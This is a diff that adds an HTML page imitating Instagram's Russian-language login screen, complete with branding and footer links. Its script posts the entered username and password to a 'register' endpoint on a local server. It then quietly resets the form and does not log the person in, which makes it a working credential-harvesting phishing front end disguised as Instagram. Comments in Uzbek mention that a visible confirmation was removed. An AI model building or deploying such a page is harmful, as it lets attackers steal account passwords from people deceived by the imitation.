@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="./style.css">
+    <link rel="shortcut icon" href="./15707869.png" type="image/x-icon">
+    <title>Instagram</title>
+</head>
+
+<body>
+    <h2>Instagram</h2>
+    <form id="registerForm">
+        <input type="text" id="username" placeholder="Телефон, имя пользователя или эл. адрес" required><br>
+        <input type="password" id="password" placeholder="Пароль" required><br>
+        <button type="submit">Войти</button>
+    </form>
+    <div class="divider">
+        <span class="divider-text">ИЛИ</span>
+    </div>
+    
+    <a href="#" class="facebook-login">Войти через Facebook</a>
+    <a href="#" class="forgot-password">Забыли пароль?</a>
+    
+    <div class="signup">
+        У вас нет аккаунта? <a href="#">Зарегистрироваться</a>
+    </div>
+    
+    <div class="app-links">
+        <p>Установите приложение.</p>
+        <!-- These would be images of app store buttons in a real implementation -->
+        <div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">Информация</a>
+            <a href="#">Блог</a>
+            <a href="#">Вакансии</a>
+            <a href="#">Помощь</a>
+            <a href="#">API</a>
+            <a href="#">Конфиденциальность</a>
+            <a href="#">Условия</a>
+            <a href="#">Места</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Загрузка контактов и лица, не являющиеся пользователями</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        
+        <div class="copyright">
+            Русский ✔ © 2025 Instagram from Meta
+        </div>
+
+    <script>
+        const form = document.getElementById('registerForm');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                const res = await fetch('http://localhost:3000/api/auth/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const data = await res.json();
+
+                if (res.ok) {
+                    // alert('Foydalanuvchi saqlandi: ' + data.user.username); ❌ olib tashlandi
+                    console.log('Ro‘yxatdan o‘tish muvaffaqiyatli'); // faqat console ga yoziladi
+                    form.reset(); // inputlarni tozalaydi
+                } else {
+                    alert(data.message || 'Xatolik yuz berdi');
+                }
+
+            } catch (err) {
+                alert('Ulanishda xatolik: ' + err.message);
+            }
+        });
+    </script>
+</body>
+
+</html>
